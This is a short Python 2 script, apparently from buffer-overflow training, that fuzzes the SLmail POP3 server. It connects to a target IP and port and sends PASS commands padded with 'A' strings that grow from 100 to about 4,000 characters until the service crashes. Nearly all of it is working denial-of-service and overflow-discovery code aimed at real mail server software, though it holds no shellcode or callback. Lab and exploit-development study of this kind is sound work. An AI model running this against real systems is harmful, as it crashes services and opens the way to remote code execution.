#!/usr/bin/python
import time, struct, sys
import socket as so

# Buff represents an array of buffers. This will be start at 100 and be incremented by 200 in order to attempt to crash SLmail.

buff=["A"]

# Maximum size of buffer.

max_buffer = 4000

# Initial counter value.

counter = 100

# Value to increment per attempt.

increment = 100


while len(buff) <= max_buffer:
    buff.append("A"*counter)
    counter=counter+increment

for string in buff:
     try:
        server = str(sys.argv[1])
        port = int(sys.argv[2])
     except IndexError:
        print "[+] Usage example: python %s <ip> <port>" % sys.argv[0]
        sys.exit()   
     print "[+] Attempting to crash app at %s bytes" % len(string)
     s = so.socket(so.AF_INET, so.SOCK_STREAM)
     try:
        s.connect((server,port))
        s.recv(1024)
        s.send("USER username" + '\r\n')
        s.recv(1024)
        s.send("PASS" + string + '\r\n')
        s.close()
     except: 
        print "[+] Connection failed at %s bytes. Make sure IP/port are correct, or check debugger for app crash." % len(string)
        sys.exit()
